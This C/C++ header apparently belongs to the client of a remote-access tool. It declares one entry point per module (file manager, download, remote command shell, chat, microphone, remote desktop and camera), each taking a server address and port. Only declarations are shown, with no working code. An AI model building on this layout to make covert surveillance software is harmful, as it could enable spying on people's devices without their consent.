#include "IOCPClient.h"
#include "FileManager.h"
#include "FileMgrSearch.h"
#include "MiniFileTrans.h"
#include "MiniDownload.h"
#include "Chat.h"
#include "Cmd.h"
#include "Audio.h"
#include "RemoteDesktop.h"
#include "Camera.h"


#include <PROCESS.H>

typedef unsigned ( __stdcall *start_address )( void * );

typedef void (*pModuleEntry)(char* szServerAddr,unsigned short uPort,DWORD dwParam);

struct ModuleContext{
	pModuleEntry	m_pEntry;
	char			szServerAddr[128];
	unsigned short	uPort;
	DWORD			m_dwParam;
};
//function declaration
void __stdcall RunModule(ModuleContext*pContext);

void BeginFileMgr(char* szServerAddr,unsigned short uPort,DWORD dwParam);
void BeginDownload(char* szServerAddr,unsigned short uPort,DWORD dwParam);
void BeginFileTrans(char* szServerAddr,unsigned short uPort,DWORD dwParam);
void BeginSearch(char* szServerAddr,unsigned short uPort,DWORD dwParam);
void BeginChat(char* szServerAddr,unsigned short uPort,DWORD dwParam);
void BeginCmd(char* szServerAddr,unsigned short uPort,DWORD dwParam);
void BeginMicrophone(char* szServerAddr, unsigned short uPort, DWORD dwParam);
void BeginDesktop(char* szServerAddr, unsigned short uPort, DWORD dwParam);
void BeginCamera(char* szServerAddr, unsigned short uPort, DWORD dwParam);